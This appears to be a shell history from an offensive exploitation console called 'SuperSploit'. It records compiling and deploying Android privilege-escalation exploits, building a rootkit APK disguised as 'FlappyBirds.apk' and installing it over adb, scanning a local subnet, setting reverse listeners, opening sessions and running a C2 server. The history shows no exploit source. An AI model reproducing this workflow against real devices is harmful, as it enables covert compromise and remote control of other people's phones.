+# 2026-06-07 17:24:11.481198
++ls
+
+# 2026-06-07 17:24:16.280868
++bash deploy_lpe.sh
+
+# 2026-06-07 17:24:54.034554
++compile source/tools/minish.c
+
+# 2026-06-07 17:25:07.772230
++compile exploits/android/badbinder_full.c
+
+# 2026-06-07 17:25:30.115228
++clear
+
+# 2026-06-07 17:25:32.508277
++bash deploy_lpe.sh
+
+# 2026-06-07 17:25:44.243554
++adb shell rm /data/local/tmp/*
+
+# 2026-06-07 17:25:45.459602
++bash deploy_lpe.sh
+
+# 2026-06-07 17:27:09.766391
++compile /home/donald/.SuperSploit/exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 17:27:16.014603
++adb shell rm /data/local/tmp/*
+
+# 2026-06-07 17:27:19.439536
++bash deploy_lpe.sh
+
+# 2026-06-07 17:29:01.189698
++set COMP_ARCH android_v7
+
+# 2026-06-07 17:29:02.270830
++compile exploits/android/cve_2023_4211_mali_leak.c
+
+# 2026-06-07 17:29:02.390627
++exit
+
+# 2026-06-07 17:29:20.554706
++adb shell rm /data/local/tmp/*
+
+# 2026-06-07 17:29:21.619379
++bash deploy_lpe.sh
+
+# 2026-06-07 17:31:09.964128
++set COMP_ARCH android_v7
+
+# 2026-06-07 17:31:11.014464
++compile exploits/android/badbinder_full.c
+
+# 2026-06-07 17:31:11.156105
++exit
+
+# 2026-06-07 17:37:44.092819
++set COMP_ARCH android_v7
+
+# 2026-06-07 17:37:45.147424
++compile exploits/android/ebpf_lpe_armv7.c
+
+# 2026-06-07 17:37:45.272752
++exit
+
+# 2026-06-07 17:38:04.934625
++set COMP_ARCH android_v7
+
+# 2026-06-07 17:38:06.011673
++compile exploits/android/ebpf_lpe_armv7.c
+
+# 2026-06-07 17:38:06.153197
++exit
+
+# 2026-06-07 17:39:22.672976
++exit
+
+# 2026-06-07 17:39:31.253837
++adb shell rm /data/local/tmp/*
+
+# 2026-06-07 17:39:36.602288
++bash deploy_lpe.sh
+
+# 2026-06-07 17:39:39.569792
++cd ss
+
+# 2026-06-07 17:39:41.841833
++bash deploy_lpe.sh
+
+# 2026-06-07 17:42:13.119625
++set COMP_ARCH android_v7
+
+# 2026-06-07 17:42:14.160112
++compile source/tools/test_packet.c
+
+# 2026-06-07 17:42:14.273845
++exit
+
+# 2026-06-07 17:55:02.997748
++adb install -r -g /home/donald/.SuperSploit/payloads/lpe_sandbox.apk
+
+# 2026-06-07 17:55:07.541608
++adb devices
+
+# 2026-06-07 17:56:12.408163
++adb install -r -g /home/donald/.SuperSploit/payloads/lpe_sandbox.apk
+
+# 2026-06-07 17:57:34.580353
++adb uninstall org.supersploit.stub
+
+# 2026-06-07 17:57:38.459875
++adb install -r -g /home/donald/.SuperSploit/payloads/lpe_sandbox.apk
+
+# 2026-06-07 18:03:37.176182
++adb logcat -d | grep "Native"
+
+# 2026-06-07 18:04:14.737540
++adb devices
+
+# 2026-06-07 18:04:18.985644
++adb logcat -d | grep "Native"
+
+# 2026-06-07 18:09:47.089949
++1 adb logcat -d -s "SuperSploitNative"
+
+# 2026-06-07 18:10:16.991078
++adb logcat -d -s "SuperSploitNative"
+
+# 2026-06-07 18:21:14.490309
++clear
+
+# 2026-06-07 18:21:16.297942
++adb logcat -d -s "SuperSploitNative"
+
+# 2026-06-07 18:21:25.017062
++exit
+
+# 2026-06-07 18:52:21.325606
++set TARGET_URI "content://com.android.providers.media.documents/document/image%3A1"
+
+# 2026-06-07 18:52:25.061580
++exploit
+
+# 2026-06-07 18:58:48.081999
++set FRP_WIPE false
+
+# 2026-06-07 18:58:51.881500
++exploit
+
+# 2026-06-07 18:59:18.706524
++clear
+
+# 2026-06-07 18:59:34.211818
++search exploits android
+
+# 2026-06-07 18:59:59.565138
++use exploit 32
+
+# 2026-06-07 19:00:03.742765
++exploit
+
+# 2026-06-07 19:01:35.776343
++sessions -i 1
+
+# 2026-06-07 19:01:43.495415
++sessions -i 2
+
+# 2026-06-07 19:02:14.232434
++adb uninstall org.supersploit.stub
+
+# 2026-06-07 19:24:06.655765
++banner
+
+# 2026-06-07 19:24:13.306883
++show
+
+# 2026-06-07 19:24:28.463926
++exploit
+
+# 2026-06-07 19:28:11.978071
++search exploits android
+
+# 2026-06-07 19:37:21.580676
++cd ss
+
+# 2026-06-07 19:37:25.980700
++cd docs
+
+# 2026-06-07 19:37:27.892807
++ls
+
+# 2026-06-07 19:38:08.910358
++adb push genini_research /sdcard/research
+
+# 2026-06-07 19:38:34.752362
++ls
+
+# 2026-06-07 19:39:02.705801
++adb push gemini_research /sdcard/read
+
+# 2026-06-07 19:47:34.509030
++clear
+
+# 2026-06-07 19:48:15.805813
++exit
+
+# 2026-06-07 19:55:45.518964
++search exploits android
+
+# 2026-06-07 20:01:51.820803
++clear
+
+# 2026-06-07 20:02:14.549524
++ls payloads
+
+# 2026-06-07 20:02:18.134078
++ls payloads/android
+
+# 2026-06-07 20:02:28.061968
++cd ss
+
+# 2026-06-07 20:02:30.278092
++ls payloads/android
+
+# 2026-06-07 20:02:54.559085
++help generate-apk
+
+# 2026-06-07 20:05:04.987950
++adb devices
+
+# 2026-06-07 20:05:07.564953
++adb connect 192.168.37.228
+
+# 2026-06-07 20:05:10.715716
++adb shell
+
+# 2026-06-07 20:06:28.629499
++clear
+
+# 2026-06-07 20:06:30.401929
++pwd
+
+# 2026-06-07 20:06:36.013317
++cleara
+
+# 2026-06-07 20:06:38.445733
++clear
+
+# 2026-06-07 20:06:49.928475
++search exploits
+
+# 2026-06-07 20:07:05.480728
++search exploits android blue
+
+# 2026-06-07 20:07:09.296238
++clear
+
+# 2026-06-07 20:07:15.349190
++show
+
+# 2026-06-07 20:07:53.194786
++clear
+
+# 2026-06-07 20:07:54.050217
++ls
+
+# 2026-06-07 20:07:59.264030
++clear
+
+# 2026-06-07 20:08:07.899373
++generate-apk-buildozer
+
+# 2026-06-07 20:08:20.003237
++set ANDROID_PAYLOAD_TYPE rootkit
+
+# 2026-06-07 20:08:22.299226
++generate-apk-buildozer
+
+# 2026-06-07 20:09:39.942100
++adb install /home/donald/.SuperSploit/payloads/android/FlappyBirds.apk
+
+# 2026-06-07 20:09:44.230454
++adb devices
+
+# 2026-06-07 20:09:49.238454
++adb disconnect
+
+# 2026-06-07 20:09:51.638577
++adb connect 192.168.37.228
+
+# 2026-06-07 20:10:14.863435
++adb devices
+
+# 2026-06-07 20:10:18.015591
++adb disconnect
+
+# 2026-06-07 20:10:20.455704
++adb devices
+
+# 2026-06-07 20:10:22.735324
++clear
+
+# 2026-06-07 20:10:25.503492
++adb connect 192.168.37.228
+
+# 2026-06-07 20:10:56.247200
++adb disconnect
+
+# 2026-06-07 20:10:58.018173
++adb connect 192.168.37.228
+
+# 2026-06-07 20:12:29.656777
++adb disconnect
+
+# 2026-06-07 20:12:30.884587
++adb connect 192.168.37.228
+
+# 2026-06-07 20:13:20.054382
++adb devices
+
+# 2026-06-07 20:13:26.238632
++adb install /home/donald/.SuperSploit/payloads/android/FlappyBirds.apk
+
+# 2026-06-07 20:22:44.797987
++exit
+
+# 2026-06-07 20:46:58.378426
++help
+
+# 2026-06-07 20:47:18.078727
++help android
+
+# 2026-06-07 20:48:08.784416
++clear
+
+# 2026-06-07 20:48:15.878605
++help
+
+# 2026-06-07 20:48:28.609574
++suggest
+
+# 2026-06-07 20:48:53.656836
++search targets
+
+# 2026-06-08 07:23:30.818211
++cd ss
+
+# 2026-06-08 07:23:37.738990
++ls .data/.help
+
+# 2026-06-08 07:23:54.591651
++help edit
+
+# 2026-06-08 07:24:10.415737
++exit
+
+# 2026-06-08 07:30:21.638041
++import profile /home/donald/.gemini/tmp/donald/tab_a8_profile.json
+
+# 2026-06-08 07:31:01.452841
++make the use command set a profile
+
+# 2026-06-08 07:33:53.130529
++search profiles samsung
+
+# 2026-06-08 07:33:59.964521
++use profile 8
+
+# 2026-06-08 07:34:05.797966
++show profile
+
+# 2026-06-08 07:34:25.854366
++use profile 8
+
+# 2026-06-08 07:34:29.009863
++show profile
+
+# 2026-06-08 07:38:48.143442
++help profile" && supersploit "show profile" && supersploit "show profiles
+
+# 2026-06-08 07:44:49.554702
++show profile
+
+# 2026-06-08 08:06:23.373860
++clear
+
+# 2026-06-08 08:06:32.824198
++import profile /home/donald/.gemini/tmp/donald/tab_a8_profile.json
+
+# 2026-06-08 08:29:59.622169
++exit
+
+# 2026-06-08 08:30:03.118679
++show profile
+
+# 2026-06-08 08:30:13.614855
++help
+
+# 2026-06-08 08:30:29.871548
++purge targets
+
+# 2026-06-08 08:30:37.224709
++purge profiles
+
+# 2026-06-08 08:30:43.953203
++import profile /home/donald/.gemini/tmp/donald/tab_a8_profile.json
+
+# 2026-06-08 08:31:33.266111
++search profiles samsung
+
+# 2026-06-08 08:31:37.202220
++use profile 0
+
+# 2026-06-08 08:31:40.426506
++show profile
+
+# 2026-06-08 08:37:29.063954
++import profile /home/donald/.gemini/tmp/donald/tab_a8_profile.json
+
+# 2026-06-08 08:45:41.067511
++ls
+
+# 2026-06-08 08:46:00.573107
++import samsung_tablet_profile.md
+
+# 2026-06-08 08:46:14.534870
++import profile samsung_tablet_profile.md
+
+# 2026-06-08 08:47:57.436864
++exit
+
+# 2026-06-08 08:48:00.261725
++import profile samsung_tablet_profile.md
+
+# 2026-06-08 08:48:05.101849
++purge profiles
+
+# 2026-06-08 08:48:12.038853
++purge database
+
+# 2026-06-08 08:48:20.206766
++clear
+
+# 2026-06-08 08:48:21.751036
++show
+
+# 2026-06-08 08:48:33.911704
++clear
+
+# 2026-06-08 08:48:39.128133
++import profile samsung_tablet_profile.md
+
+# 2026-06-08 08:48:42.000419
++use profile 0
+
+# 2026-06-08 08:48:45.808623
++show profile
+
+# 2026-06-08 08:54:05.156724
++exit
+
+# 2026-06-08 08:54:09.093280
++import profile samsung_tablet_profile.md
+
+# 2026-06-08 08:54:11.173381
++show profile
+
+# 2026-06-08 09:00:37.362779
++exit
+
+# 2026-06-08 09:00:42.068530
++import profile samsung_tablet_profile.md
+
+# 2026-06-08 09:00:52.584555
++search profiles samsung
+
+# 2026-06-08 09:00:56.845047
++use profile 0
+
+# 2026-06-08 09:00:59.836604
++show profile
+
+# 2026-06-08 09:03:08.927918
++clear
+
+# 2026-06-08 09:03:13.258742
++show profile
+
+# 2026-06-08 09:17:07.801792
++clear
+
+# 2026-06-08 09:17:11.168396
++purge profiles
+
+# 2026-06-08 09:17:14.648426
++show profile
+
+# 2026-06-08 09:17:19.584336
++search targets
+
+# 2026-06-08 09:17:21.577221
++show profile
+
+# 2026-06-08 09:17:27.872246
++clear
+
+# 2026-06-08 09:18:17.585336
++banner
+
+# 2026-06-08 09:18:22.106287
++import profile samsung_tablet_profile.md
+
+# 2026-06-08 09:18:27.337469
++use profile 0
+
+# 2026-06-08 09:18:40.449648
++show profile
+
+# 2026-06-08 09:22:17.534439
++clear
+
+# 2026-06-08 09:22:24.502651
++search exploits android
+
+# 2026-06-08 09:22:46.528893
++clear
+
+# 2026-06-08 09:22:50.576761
++search exploits
+
+# 2026-06-08 09:23:51.073235
++clear
+
+# 2026-06-08 09:23:54.886777
++search exploits pwn
+
+# 2026-06-08 09:24:03.577379
++use exploit 61
+
+# 2026-06-08 09:24:09.385950
++show exploit
+
+# 2026-06-08 09:26:46.054838
++show
+
+# 2026-06-08 09:26:57.862577
++cat /home/donald/.SuperSploit/exploits/linux/cve_2021_4034_pwnkit.c
+
+# 2026-06-08 09:28:25.661117
++clear
+
+# 2026-06-08 09:28:44.050623
++search exploits adb
+
+# 2026-06-08 09:29:18.587581
++cat /home/donald/.SuperSploit/exploits/android/cve_2026_0073_adb_masterkey.py
+
+# 2026-06-08 09:33:06.851080
++clear
+
+# 2026-06-08 09:33:16.491313
++show profile
+
+# 2026-06-08 10:06:07.547147
++exit
+
+# 2026-06-08 10:06:22.675891
++set LISTENER true
+
+# 2026-06-08 10:06:28.020275
++clear
+
+# 2026-06-08 10:06:31.883657
++ip addr
+
+# 2026-06-08 10:06:41.972252
++set host 192.168.191.158
+
+# 2026-06-08 10:06:48.188623
++set LISTENER true
+
+# 2026-06-08 10:07:03.933052
++clear
+
+# 2026-06-08 10:07:13.125176
++set host 0.0.0.0
+
+# 2026-06-08 10:07:19.718330
++set LISTENER true
+
+# 2026-06-08 10:07:49.573998
++clear
+
+# 2026-06-08 10:07:51.256221
++help
+
+# 2026-06-08 10:08:35.057011
++help profile
+
+# 2026-06-08 10:20:46.726601
++search exploits cwe
+
+# 2026-06-08 10:20:57.392863
++search exploits test cwe
+
+# 2026-06-08 10:20:59.804800
++clear
+
+# 2026-06-08 10:21:01.261522
++search exploits test cwe
+
+# 2026-06-08 10:21:09.949183
++set LISTENER true
+
+# 2026-06-08 10:21:13.324851
++show
+
+# 2026-06-08 10:21:45.851215
++ip addr
+
+# 2026-06-08 10:21:58.692703
++set host 192.168.191.158
+
+# 2026-06-08 10:22:04.162460
++set LISTENER true
+
+# 2026-06-08 10:24:09.789006
++exit
+
+# 2026-06-08 10:24:12.669833
++set LISTENER true
+
+# 2026-06-08 10:25:52.594794
++exit
+
+# 2026-06-08 10:25:55.946708
++set LISTENER true
+
+# 2026-06-08 10:26:11.050631
++show
+
+# 2026-06-08 10:26:42.370061
++clear
+
+# 2026-06-08 10:26:50.153382
++search exploits test
+
+# 2026-06-08 10:27:24.392745
++use exploit 68
+
+# 2026-06-08 10:27:27.341982
++clear
+
+# 2026-06-08 10:27:30.520919
++show exploit
+
+# 2026-06-08 10:27:50.256374
++searc recon disc
+
+# 2026-06-08 10:27:53.592299
++search recon disc
+
+# 2026-06-08 10:28:03.784234
++use recon 1
+
+# 2026-06-08 10:28:25.704403
++set target  ____                                  _       _ _   
++/ ___| _   _ _ __   ___ _ __ ___ _ __ | | ___ (_) |_ 
++\___ \| | | | '_ \ / _ \ '__/ __| '_ \| |/ _ \| | __|
++ ___) | |_| | |_) |  __/ |  \__ \ |_) | | (_) | | |_ 
++|____/ \__,_| .__/ \___|_|  |___/ .__/|_|\___/|_|\__|
++            |_|                 |_|                  
++
++The goal of OSINT is to turn raw data into "Actionable Intelligence" for decision-making.
++[SuperSploit]: set LISTENER true
++[*] LISTENER => True
++
++[SuperSploit]: [!] Listener Error: cannot access local variable 'host' where it is not associated with a value
++
++
++
+
+# 2026-06-08 10:29:15.943892
++set target 192.168.191.0/24
+
+# 2026-06-08 10:29:23.904249
++run
+
+# 2026-06-08 10:32:24.558653
++set target 192.168.191.225
+
+# 2026-06-08 10:32:29.814530
++show
+
+# 2026-06-08 10:32:37.662599
++clear
+
+# 2026-06-08 10:33:33.182001
++help vars
+
+# 2026-06-08 10:34:23.022707
++show EXPLOIT PAYLOAD STAGE_TWO
+
+# 2026-06-08 10:34:38.854681
++show STAGE_TWO
+
+# 2026-06-08 10:34:43.534807
++clear
+
+# 2026-06-08 10:34:51.399164
++show exploit
+
+# 2026-06-08 10:35:14.565073
++search payloads
+
+# 2026-06-08 10:35:28.863266
++use payload 6
+
+# 2026-06-08 10:35:36.703182
++use stage2 0
+
+# 2026-06-08 10:35:43.728298
++clear
+
+# 2026-06-08 10:35:45.062753
++show
+
+# 2026-06-08 10:37:08.545132
++set port 8080
+
+# 2026-06-08 10:37:11.567768
++clear
+
+# 2026-06-08 10:37:18.207932
++search recon
+
+# 2026-06-08 10:37:28.392028
++use recon 4
+
+# 2026-06-08 10:37:58.056490
++run
+
+# 2026-06-08 10:38:48.008597
++search targets
+
+# 2026-06-08 10:38:56.121031
++search targets 3
+
+# 2026-06-08 10:39:34.122539
++import profile 192.168.191.225
+
+# 2026-06-08 10:39:40.729401
++help profiles
+
+# 2026-06-08 10:39:42.561179
++help profile
+
+# 2026-06-08 10:39:54.497467
++add profile 192.168.191.225
+
+# 2026-06-08 10:40:09.258073
++add profile --import 192.168.191.225
+
+# 2026-06-08 10:40:12.721644
++clear
+
+# 2026-06-08 10:40:19.338296
++search profiles
+
+# 2026-06-08 10:40:31.873780
++use profile 0
+
+# 2026-06-08 10:40:35.521819
++show profile
+
+# 2026-06-08 10:40:53.290315
++use profile 1
+
+# 2026-06-08 10:40:54.842038
++show profile
+
+# 2026-06-08 10:40:56.818126
++clear
+
+# 2026-06-08 10:41:09.106287
++suggest
+
+# 2026-06-08 10:42:06.258574
++exploit
+
+# 2026-06-08 10:44:53.134327
++set host 192.168.191.158
+
+# 2026-06-08 10:45:00.798497
++set L_HOST 192.168.191.158
+
+# 2026-06-08 10:45:03.666632
++set LHOST 192.168.191.158
+
+# 2026-06-08 10:45:10.109637
++set LISTENER true
+
+# 2026-06-08 10:45:18.285871
++exploit
+
+# 2026-06-08 10:46:16.966246
++clear
+
+# 2026-06-08 10:46:28.482936
++help compile
+
+# 2026-06-08 10:46:59.920425
++set COMP_ARCH x86_64
+
+# 2026-06-08 10:47:14.944100
++compile source/tools/minish.c
+
+# 2026-06-08 10:47:43.263975
++cd ss
+
+# 2026-06-08 10:47:57.360313
++compile tools/cve_lookup.c
+
+# 2026-06-08 10:48:05.200318
++ls source/tools
+
+# 2026-06-08 10:48:48.497867
++compile source/tools/android_lpe_cve_lookup.c
+
+# 2026-06-08 10:49:12.017642
++set COMP_ARCH android86_64
+
+# 2026-06-08 10:49:17.801712
++set COMP_ARCH androidx86_64
+
+# 2026-06-08 10:49:21.129397
++help compile
+
+# 2026-06-08 10:49:40.226507
++set COMP_ARCH android_arm64
+
+# 2026-06-08 10:49:44.594193
++compile source/tools/android_lpe_cve_lookup.c
+
+# 2026-06-08 10:49:59.754397
++compile source/tools/minish.c
+
+# 2026-06-08 10:50:44.716006
++compile source/tools/android_lpe_enum.c
+
+# 2026-06-08 10:50:58.457241
++sessions -i 2
+
+# 2026-06-08 10:51:01.579523
++sessions
+
+# 2026-06-08 10:51:08.563526
++exploit
+
+# 2026-06-08 10:51:21.699753
++sessions -i 2
+
+# 2026-06-08 10:52:52.813370
++ls payloads
+
+# 2026-06-08 10:53:07.525461
++sessions -i 2
+
+# 2026-06-08 10:54:13.830820
++exploit
+
+# 2026-06-08 10:54:25.206385
++sessions -i 3
+
+# 2026-06-08 10:55:28.847597
++exploit
+
+# 2026-06-08 10:55:38.016334
++sessions -i 4
+
+# 2026-06-08 10:59:31.083753
++exit
+
+# 2026-06-08 10:59:36.701009
++clear
+
+# 2026-06-08 10:59:43.757212
++exploit
+
+# 2026-06-08 11:00:03.757890
++sessions -i 
+
+# 2026-06-08 11:00:07.093283
++sessions -i 1
+
+# 2026-06-08 11:05:59.467651
++ls payloads/
+
+# 2026-06-08 11:06:01.971611
++ls payloads
+
+# 2026-06-08 11:06:47.030728
++gcc source/tools/android_lpe_cve_lookup.c -o cve
+
+# 2026-06-08 11:06:53.041337
++cd ss
+
+# 2026-06-08 11:06:54.124772
++gcc source/tools/android_lpe_cve_lookup.c -o cve
+
+# 2026-06-08 11:07:11.917621
++clear
+
+# 2026-06-08 11:07:14.705840
++help compile
+
+# 2026-06-08 11:07:56.534398
++set COMP_ARCH x86_64
+
+# 2026-06-08 11:07:59.078464
++compile source/tools/android_lpe_enum.c
+
+# 2026-06-08 11:09:05.119666
++clear
+
+# 2026-06-08 11:09:07.485588
++sessions
+
+# 2026-06-08 11:19:21.307261
++sessions -i 1
+
+# 2026-06-08 11:20:58.200666
++set LISTENER true
+
+# 2026-06-08 11:22:08.716080
++ls payloads/stage2
+
+# 2026-06-08 11:22:12.124329
++cd ss
+
+# 2026-06-08 11:22:13.108519
++ls payloads/stage2
+
+# 2026-06-08 11:22:18.613174
++ls payloads/
+
+# 2026-06-08 11:22:26.525079
++ls payloads/Stage2
+
+# 2026-06-08 11:22:44.855749
++compile payloads/Stage2/drs.c
+
+# 2026-06-08 11:23:02.542535
++sessions -i 1
+
+# 2026-06-08 11:23:09.798095
++sessions
+
+# 2026-06-08 11:23:13.375090
++exploit
+
+# 2026-06-08 11:23:29.487914
++sessions
+
+# 2026-06-08 11:23:32.399723
++jobs
+
+# 2026-06-08 11:23:36.048095
++clear
+
+# 2026-06-08 11:23:37.705328
++sessions
+
+# 2026-06-08 11:23:45.618352
++sessions -i 1
+
+# 2026-06-08 11:23:49.762086
++sessions
+
+# 2026-06-08 11:23:57.897886
++exploit
+
+# 2026-06-08 11:24:12.905729
++sessions -i 2
+
+# 2026-06-08 11:25:47.879691
++sessions
+
+# 2026-06-08 11:39:25.285060
++clear
+
+# 2026-06-08 11:39:34.116901
++set COMP_ARCH android_x86_64
+
+# 2026-06-08 11:39:52.173511
++set COMP_STATIC true
+
+# 2026-06-08 11:40:01.229810
++compile payloads/Stage2/drs.c
+
+# 2026-06-08 11:40:11.358181
++exploit
+
+# 2026-06-08 11:40:24.454598
++sessions -i 1
+
+# 2026-06-08 11:42:42.715394
++show L_HOST
+
+# 2026-06-08 11:42:58.227615
++show
+
+# 2026-06-08 11:43:34.013081
++exploit
+
+# 2026-06-08 11:44:07.974112
++set LISTENER true
+
+# 2026-06-08 11:44:11.685868
++sessions -i 1
+
+# 2026-06-08 11:44:26.934188
++sessions -i 1
+
+# 2026-06-08 11:46:04.873856
++sessions
+
+# 2026-06-08 11:50:47.453687
++help workspace
+
+# 2026-06-08 11:51:35.533505
++workspace create session_1
+
+# 2026-06-08 11:51:49.909008
++workspace create session_alpha
+
+# 2026-06-08 11:51:55.046054
++workspace create sessionAlpha
+
+# 2026-06-08 11:51:59.965517
++clear
+
+# 2026-06-08 11:52:12.933781
++exploit
+
+# 2026-06-08 11:52:21.045973
++show
+
+# 2026-06-08 11:52:28.750414
++set host 192.168.191.158
+
+# 2026-06-08 11:52:35.678675
++set l_port 5000
+
+# 2026-06-08 11:53:01.135568
++workspace create sessionBeta
+
+# 2026-06-08 11:53:10.151687
++set host 192.168.191.158
+
+# 2026-06-08 11:53:19.392494
++set l_port 9997
+
+# 2026-06-08 11:53:29.648712
++set LISTENER true
+
+# 2026-06-08 11:53:39.192518
++set LISTENER true
+
+# 2026-06-08 11:53:50.896991
++search exploits test cwe
+
+# 2026-06-08 11:53:55.137305
++use exploit 68
+
+# 2026-06-08 11:53:58.353176
++use stage2 0
+
+# 2026-06-08 11:54:02.337280
++clear
+
+# 2026-06-08 11:54:03.833289
++show
+
+# 2026-06-08 11:54:11.297652
++use payload 6
+
+# 2026-06-08 11:54:13.970421
++clear
+
+# 2026-06-08 11:54:15.457739
++show
+
+# 2026-06-08 11:54:19.322038
++clear
+
+# 2026-06-08 11:54:22.146302
++use payload 6
+
+# 2026-06-08 11:54:24.610006
++use exploit 68
+
+# 2026-06-08 11:54:34.490345
++clear
+
+# 2026-06-08 11:54:39.394466
++set target 192.168.191.225
+
+# 2026-06-08 11:54:45.802236
++set port 8080
+
+# 2026-06-08 11:54:49.210684
++exploit
+
+# 2026-06-08 11:55:02.331235
++sessions
+
+# 2026-06-08 11:55:05.092083
++sessions -i 1
+
+# 2026-06-08 11:55:19.131378
++jobs
+
+# 2026-06-08 11:56:19.182006
++cd ss
+
+# 2026-06-08 11:56:24.117999
++ls source/tools
+
+# 2026-06-08 11:57:14.087423
++python3 source/tools/c2_server.py
+
+# 2026-06-08 11:57:27.839841
++sessions
+
+# 2026-06-08 12:00:00.900826
++set COMP_STATIC true
+
+# 2026-06-08 12:00:25.116979
++set COMP_ARCH android_x86_64
+
+# 2026-06-08 12:00:30.125666
++compile payloads/Stage2/drs.c
+
+# 2026-06-08 12:00:37.182749
++exploit
+
+# 2026-06-08 12:00:49.854316
++sessions -i 2
+
+# 2026-06-08 12:01:27.877065
++exploit
+
+# 2026-06-08 12:01:50.149498
++sessions -i 3
+
+# 2026-06-08 12:03:21.883536
++exploit
+
+# 2026-06-08 12:03:35.471544
++sessions -i 4
+
+# 2026-06-08 12:04:54.522123
++whoami
+
+# 2026-06-08 12:05:56.046828
++python3 source/tools/c2_server.py
+
+# 2026-06-08 12:05:59.189809
++cd ss
+
+# 2026-06-08 12:06:00.184185
++python3 source/tools/c2_server.py
+
+# 2026-06-08 12:06:34.397192
++clear
+
+# 2026-06-08 12:06:39.743078
++sessions
+
+# 2026-06-08 12:06:42.614871
++clear
+
+# 2026-06-08 12:07:05.146693
++clear
+
+# 2026-06-08 12:07:10.587681
++jobs
+
+# 2026-06-08 12:07:13.867771
++jobs
+
+# 2026-06-08 12:07:23.613751
++help
+
+# 2026-06-08 12:08:13.997099
++help edit
+
+# 2026-06-08 12:08:28.591434
++show profiles
+
+# 2026-06-08 12:08:39.328981
++import profile 192.168.191.225
+
+# 2026-06-08 12:08:50.057386
++import profile samsung_tablet_profile.md
+
+# 2026-06-08 12:08:58.179428
++import profile profiles/samsung_tablet_profile.md
+
+# 2026-06-08 12:09:00.731798
++cd ss
+
+# 2026-06-08 12:09:01.845057
++import profile profiles/samsung_tablet_profile.md
+
+# 2026-06-08 12:09:04.291805
++clear
+
+# 2026-06-08 12:09:38.072418
++exit
+
+# 2026-06-08 12:09:41.621556
++exit
+
+# 2026-06-08 12:09:50.682471
++workspace list
+
+# 2026-06-08 12:10:02.979763
++workspace use sessionAlpha
+
+# 2026-06-08 12:10:32.215383
++workspace list
+
+# 2026-06-08 12:10:48.817929
++workspace use session beta
+
+# 2026-06-08 12:10:51.465535
++workspace use sessionbeta
+
+# 2026-06-08 12:11:06.035773
++workspace use sessionBeta
+
+# 2026-06-08 12:11:08.882764
++clear
+
+# 2026-06-08 12:11:12.699727
++show
+
+# 2026-06-08 12:11:20.836197
++show
+
+# 2026-06-08 12:11:43.407130
++exploit
+
+# 2026-06-08 12:12:08.585910
++show
+
+# 2026-06-08 12:12:14.602576
++set target 192.168.191.225
+
+# 2026-06-08 12:12:32.620356
++workspace use default
+
+# 2026-06-08 12:12:34.804451
++show
+
+# 2026-06-08 12:12:57.895182
++workspace use sessionBeta
+
+# 2026-06-08 12:13:00.254804
++show
+
+# 2026-06-08 12:13:08.280837
++exploit
+
+# 2026-06-08 12:13:48.051831
++set l_port 5000
+
+# 2026-06-08 12:13:51.243862
++clear
+
+# 2026-06-08 12:13:54.677244
++sessions
+
+# 2026-06-08 12:13:57.044873
++jobs
+
+# 2026-06-08 12:14:01.917299
++sessions
+
+# 2026-06-08 12:14:04.029226
++jobs
+
+# 2026-06-08 12:14:08.870143
++set LISTENER true
+
+# 2026-06-08 12:14:11.262138
++jobs
+
+# 2026-06-08 12:14:14.062166
++clear
+
+# 2026-06-08 12:14:16.430437
++jobs
+
+# 2026-06-08 12:14:52.442568
++sessions
+
+# 2026-06-08 12:14:57.354338
++sessions -i 1
+
+# 2026-06-08 12:15:01.250944
++clear
+
+# 2026-06-08 12:15:03.642616
++sessions
+
+# 2026-06-08 12:15:07.651591
++exploit
+
+# 2026-06-08 12:15:58.936549
++show
+
+# 2026-06-08 12:16:06.409104
++show
+
+# 2026-06-08 12:16:33.563515
++set l_port 9999
+
+# 2026-06-08 12:16:56.885397
++workspace show
+
+# 2026-06-08 12:17:00.245821
++workspace list
+
+# 2026-06-08 12:17:09.206464
++workspace list
+
+# 2026-06-08 12:17:22.286536
++workspace use sessionAlpha
+
+# 2026-06-08 12:21:11.283788
++show
+
+# 2026-06-08 12:21:21.164799
++update-info
+
+# 2026-06-08 12:21:22.580498
++show
+
+# 2026-06-08 12:21:28.401488
++clear
+
+# 2026-06-08 12:21:29.604064
++show
+
+# 2026-06-08 12:21:45.986058
++exploit
+
+# 2026-06-08 12:22:04.505968
++sessions
+
+# 2026-06-08 12:28:09.745153
++show
+
+# 2026-06-08 12:28:17.968388
++exploit
+
+# 2026-06-08 12:28:39.623747
++use stage2 0
+
+# 2026-06-08 12:28:44.184281
++exploit
+
+# 2026-06-08 12:30:58.925437
++clear
+
+# 2026-06-08 12:31:01.261738
++sessions
+
+# 2026-06-08 12:31:20.126163
++sessions -i 1
+
+# 2026-06-08 12:31:41.447043
++set LISTENER true
+
+# 2026-06-08 12:33:24.819153
++exploit
+
+# 2026-06-08 12:33:38.851608
++sessions -i 1
+
+# 2026-06-08 12:55:27.391764
++exploit
+
+# 2026-06-08 12:55:36.374473
++clear
+
+# 2026-06-08 12:55:39.590347
++set LISTENER true
+
+# 2026-06-08 12:56:07.427313
++clear
+
+# 2026-06-08 12:56:13.330695
++run
+
+# 2026-06-08 12:56:24.881724
++use recon 4
+
+# 2026-06-08 12:56:27.009186
++run
+
+# 2026-06-08 12:57:13.549258
++clear
+
+# 2026-06-08 12:57:28.571278
++sessions -i 1
+
+# 2026-06-08 12:57:32.267932
++sessions
+
+# 2026-06-08 12:57:36.747494
++sessions -i 2
+
+# 2026-06-08 12:57:45.851008
++clear
+
+# 2026-06-08 12:57:49.562565
++search targets
+
+# 2026-06-08 12:58:02.561169
++use recon 0
+
+# 2026-06-08 12:58:05.937708
++run
+
+# 2026-06-08 12:58:18.256455
++use recon 1
+
+# 2026-06-08 12:58:25.952331
++set target 192.168.191.0/24
+
+# 2026-06-08 12:58:27.920214
++run
+
+# 2026-06-08 12:58:42.247561
++search targets
+
+# 2026-06-08 12:58:50.375105
++import targets
+
+# 2026-06-08 13:00:03.747836
++import targets .data/.config/targets.json
+
+# 2026-06-08 13:02:53.279551
++pwd
+
+# 2026-06-08 13:02:55.939812
++cd ss
+
+# 2026-06-08 13:02:57.695520
++clear
+
+# 2026-06-08 13:03:08.477775
++import targets .data/.targets/targets.json
+
+# 2026-06-08 13:04:11.319205
++import targets /home/donald/.SuperSploit.data/.targets/targets.json
+
+# 2026-06-08 13:04:17.398346
++ls
+
+# 2026-06-08 13:04:28.286372
++import targets .data/.targets/targets.json
+
+# 2026-06-08 13:05:06.105055
++clear
+
+# 2026-06-08 13:05:08.110995
++exit
+
+# 2026-06-08 13:05:15.181186
++clear
+
+# 2026-06-08 13:05:28.981901
++exit
+
+# 2026-06-08 13:05:34.486875
++help
+
+# 2026-06-08 13:08:11.167002
